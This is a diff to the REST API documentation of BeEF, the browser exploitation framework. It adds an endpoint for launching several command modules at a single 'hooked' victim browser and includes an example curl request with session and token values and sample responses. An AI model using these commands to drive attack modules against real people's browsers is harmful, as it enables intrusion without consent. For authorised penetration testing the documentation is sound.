@@ -384,13 +384,40 @@ curl -H "Content-Type: application/json; charset=UTF-8" -d '{"mod_id":110,"mod_p
 
 **Response**
 
-NOTE: in this case we cannot query BeEF nor Metasploit if module execution was successful or not.
-This is why there is "command_id":"not_available" in the response.
-
 ```json
 {
-    "success": "true",
-    "command_id": "not_available"
+"1":16,
+"2":17
+}
+```
+
+## Send multiple modules to a single hooked browser
+
+###Handler
+* **URL** : POST /api/modules/multi_module
+* **Description** : Fire multiple command modules to a single hooked browser. Returns the command IDs of the launched modules, or 0 if firing got issues.
+* **Parameters** :
+  * hb : hooked browser session
+  * modules : an array containing all the modules to be launched, with the following two keys:
+     * mod_id : module ID
+     * mod_input : module custom input
+### Example : 
+
+NOTE: Alert module with custom text, 2 hooked browsers. For modules that don't need parameters, just pass an empty JSON object like {}.
+
+**Request** :
+
+```bash
+curl -H "Content-Type: application/json; charset=UTF-8" -d '{"hb":"vkIwVV3ok5i5vH2f8sxlkoaKqAGKCbZXdWqE9vkHNFBhI8aBBHvtZAGRO2XqFZXxThBlmKlRiVwPeAzj","modules":[{"mod_id":99,"mod_input":[{"repeat":"10"},{"repeat_string":"ABCDE"}]},{"mod_id":116,"mod_input":[{"question":"hooked?"}]},{"mod_id":128,"mod_input":[]}]}' -X POST http://beefserver.com:3000/api/modules/multi_module?token=e640483ae9bca2eb904f003f27dd4bc83936eb92
+```
+
+**Response**
+NOTE: the following means the Alert Dialog module execution had issues (returning 0).
+```json
+{
+"99":7,
+"116":8,
+"128":0
 }
 ```
 
